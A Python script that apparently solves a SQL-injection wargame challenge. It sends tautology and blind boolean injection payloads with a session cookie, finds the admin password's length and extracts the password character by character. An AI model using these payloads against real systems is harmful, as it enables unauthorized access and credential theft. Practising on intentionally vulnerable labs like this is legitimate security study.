import requests

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookie = {'PHPSESSID': 'jlbe47hgjd8egih7n59612qdn8'}

def test():
    param = {"pw":"' || 1=1 -- -"}
    req = requests.get(url, params=param, cookies=cookie)
    if "Hello admin" in req.text:
        print(param["pw"], "True")
    else:
        print(param["pw"], "False")

def pw_len():
    for pw_length in range(50):
        param = {"pw":"' || id='admin' && length(pw) = {} #".format(pw_length)}
        req = requests.get(url, params=param, cookies=cookie)

        if "Hello admin" in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    for i in range(length):
        for value in range(127):
            param = {"pw":"' || id='admin' && ascii(substring(pw, {}, 1)) = {} #".format(i+1, value)}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
    print("Password:", password)

pw_find()